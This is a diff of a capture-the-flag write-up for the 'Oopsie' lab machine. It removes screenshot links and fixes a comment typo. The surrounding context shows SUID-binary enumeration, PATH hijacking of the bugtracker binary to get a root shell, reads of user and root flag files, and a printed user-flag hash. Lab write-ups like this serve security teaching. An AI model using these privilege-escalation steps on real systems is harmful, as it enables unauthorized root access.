@@ -592,8 +592,6 @@ robert@oopsie:~$ id
 uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
 \`\`\`
 
-![User Flag](/writeups/oopsie-11.png)
-
 \`\`\`bash
 cat ~/user.txt
 f2c74ee8db7983851ab2a96a44eb7981
@@ -613,8 +611,6 @@ find / -group bugtracker -perm -4000 2>/dev/null
 
 This returns \`/usr/bin/bugtracker\`:
 
-![SUID Binary](/writeups/oopsie-12.png)
-
 \`\`\`bash
 ls -la /usr/bin/bugtracker
 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
@@ -623,8 +619,6 @@ ls -la /usr/bin/bugtracker
 ### Analyzing the Binary
 
 Run the binary to see what it does:
-
-![Binary Execution](/writeups/oopsie-13.png)
 
 \`\`\`
 bugtracker
@@ -665,8 +659,6 @@ echo $PATH
 
 **Step 3** — Run \`bugtracker\`:
 
-![Root Access](/writeups/oopsie-14.png)
-
 \`\`\`bash
 bugtracker
 ------------------
@@ -679,8 +671,6 @@ root
 # id
 uid=0(root) gid=0(root) groups=0(root)
 \`\`\`
-
-![Root Flag](/writeups/oopsie-15.png)
 
 \`\`\`bash
 cat /root/root.txt
@@ -725,7 +715,7 @@ if (!in_array($mime, $allowed_types)) {
 
 **Fix:**
 \`\`\`c
-// Safesystem("/bin/cat /root/reports/...");
+// Safe: system("/bin/cat /root/reports/...");
 system("cat /root/reports/..."); // Vulnerable
 \`\`\`
 
